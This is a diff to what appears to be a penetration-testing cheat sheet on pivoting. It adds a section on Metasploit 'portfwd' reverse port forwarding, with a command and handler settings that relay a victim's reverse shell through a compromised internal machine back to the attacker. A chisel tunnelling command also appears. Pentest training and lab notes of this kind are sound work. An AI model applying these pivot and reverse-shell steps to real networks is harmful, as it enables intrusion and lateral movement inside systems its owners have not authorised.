@@ -39,7 +39,15 @@ chisel client --fingerprint "       " 192.168.1.100:8080 0.0.0.0:9999:192.168.1.
 ```
 
 
-## Metasploit 
+# Metasploit PortForwarding and Getting ReverseShell Instead of Bindshell
+- Need meterpreter session on compromised machine
+- Route traffic inside internal network
+```
+portfwd add -R -L 10.10.16.3(attacking machine ip) -l 8888(attacking machine port) -p 7777(compromised machine 1 port) -r 10.0.24.164(compromised machine 1)
+```
+- Open another msfconsole with multi/handler and set lhost to 0.0.0.0(attacking machine) , set lport to 8888(attacking machine port)
+- In revershell payload set lhost to 10.0.24.164(compromised machine 1) set lport to -p 7777(compromised machine 1 port)
+- What happened is when victim connect reverse shell back, it connect to compromised machine 1 first on port 7777, but it is forwarded to 0.0.0.0(attacking machine) on port 8888 and got the connection.
 
 # SSH Port Forwarding 
 
